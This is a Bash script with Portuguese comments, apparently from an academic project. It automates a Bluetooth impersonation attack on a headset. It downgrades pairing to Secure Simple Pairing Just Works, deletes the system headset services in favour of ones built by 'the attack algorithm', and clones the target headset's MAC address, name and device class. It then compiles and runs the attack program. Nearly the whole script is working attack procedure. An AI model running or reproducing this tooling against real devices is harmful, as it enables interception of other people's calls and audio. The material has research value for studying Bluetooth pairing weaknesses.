#!/bin/bash

printf "Controladores Bluetooth existentes na máquina:\n"
hciconfig -a

#Reinicia um ou mais dispositivos que tenham sido plugados recentemente e
#não tenham sido devidamente inicializados
IND_RESET=0
while [ "$IND_RESET" != "-1" ]
do
  printf "Digite o índice do hci do aparelho que necessita ser reiniciado\nou -1 caso não exista mais nenhum\n"
  read IND_RESET
  if [ "$IND_RESET" != "-1" ]
  then
	hciconfig hci$IND_RESET reset
  fi
done
printf "\n"

#Desativa o modo de operação Low Energy dos adaptadores compatíveis com ele
#para permitir somente o emparelhamento Secure Simple Pairing no modo BR/EDR
IND_LE=0
while [ "$IND_LE" != "-1" ]
do
  printf "Digite o índice do hci do aparelho que é Low Energy\nou -1, caso não tenha nenhum ou todos já tenham sido configurados\n"
  read IND_LE
  if [ "$IND_LE" != "-1" ]
  then
	btmgmt --index $IND_LE sc off; btmgmt --index $IND_LE le off
	printf "\n"
  fi
done
printf "\n"

#Torna o dispositivo que está simulando o headset (hci0), detectável e conectável e
#o outro (hci1), somente conectável.
btmgmt --index 0 connectable on; btmgmt --index 0 discov on; btmgmt --index 1 connectable on
printf "\n"

#Executa o comando para corrigir o bug no roteamento dos pacotes do SCO nos adaptadores
#que necessitarem desta correção
IND_BUG=0
while [ "$IND_BUG" != "-1" ]
do
  printf "Digite o índice do hci do aparelho que possui falha no SCO\nou -1, caso não tenha nenhum ou todos já tenham sido configurados\n"
  read IND_BUG
  if [ "$IND_BUG" != "-1" ]
  then
	hcitool -i hci$IND_BUG cmd 0x3F 0x01C 0x01 0x02 0x00 0x01 0x01
	printf "\n"
  fi
done
printf "\n"

#Mostra todos os serviços disponibilizados localmente
sdptool browse local
printf "\n"

#Exclui os serviços HSAG padrões do sistema para forçar a utilização dos
#que são criados pelo algoritmo de ataque
SVC_TO_DELETE=0
while [ "$SVC_TO_DELETE" != "-1" ]
do
  printf "Digite o handle do serviço HSAG a ser excluído\nou -1, caso não tenha nenhum ou todos já tenham sido excluídos\n"
  read SVC_TO_DELETE
  if [ "$SVC_TO_DELETE" != "-1" ]
  then
	sdptool del $SVC_TO_DELETE
	printf "\n"
  fi
done
printf "\n"

#Executa a busca de dispositivos próximos
hcitool scan
#Executa a busca de dispositivos próximos mostrando a classe de cada equipamento
hcitool inq
#Reinicia a busca caso o headset não tenha sido encontrado
OPCAO_SCAN=0
while [ "$OPCAO_SCAN" != "n" ]
do
  printf "É necessário reiniciar o escaneamento? (sim: s/não: n)\n"
  read OPCAO_SCAN
  if [ "$OPCAO_SCAN" == "s" ]
  then
	hcitool scan
	hcitool inq
  fi
done
printf "\n"

printf "Digite o endereço do headset\n"
read ENDR_HS
CLONA_MAC=0
printf "Deseja efetuar a clonagem do endereço MAC do headset? (sim: s/não: n)\n"
read CLONA_MAC
if [ "$CLONA_MAC" == "s" ]
then
	COMP_BDADDR=0
	printf "O bdaddr já foi compilado? (sim: s/não: n)\n"
	read COMP_BDADDR
	if [ "$COMP_BDADDR" == "n" ]
	then
		cd bdaddr/
		make
	fi
	printf "\n"
	#Clona o endereço MAC do headset
	./bdaddr -i hci0 $ENDR_HS
	printf "\n"
	hciconfig hci0 reset
	cd -
fi
printf "\n"

printf "Digite o nome do headset\n"
read NOME_HS
#Clona o nome do headset
btmgmt --index 0 name $NOME_HS

printf "Digite a classe do headset\n"
read CLASSE_HS
#Clona a classe do headset
hciconfig hci0 class $CLASSE_HS
printf "\n"

#Compila o algoritmo se for necessário
COMP_ALG=0
printf "O algoritmo já foi compilado? (sim: s/não: n)\n"
read COMP_ALG
if [ "$COMP_ALG" == "n" ]
then
	gcc main.c gerenc_adaptador.c servicos.c sockets.c -I "/usr/include/dbus-1.0/" -I "/usr/lib/x86_64-linux-gnu/dbus-1.0/include/" -L `pkg-config --cflags --libs libpulse-simple` -L `pkg-config --cflags --libs dbus-1` -lbluetooth -o tcc
fi
printf "\n"

#Executa o algoritmo passando o endereço do headset como argumento
./tcc $ENDR_HS

#Executa o outro script responsável por executar o bluetoothctl
#com a configuração de E/S disponível, NoInputNoOutput,
#que faz com que seja efetuado o emparelhamento SSP com Just Works
readonly BLUECTL_SCRIPT="script-tcc-bluectl.sh"
chmod +x $BLUECTL_SCRIPT
gnome-terminal -x bash -c "./$BLUECTL_SCRIPT; exec $SHELL"
printf "\n"
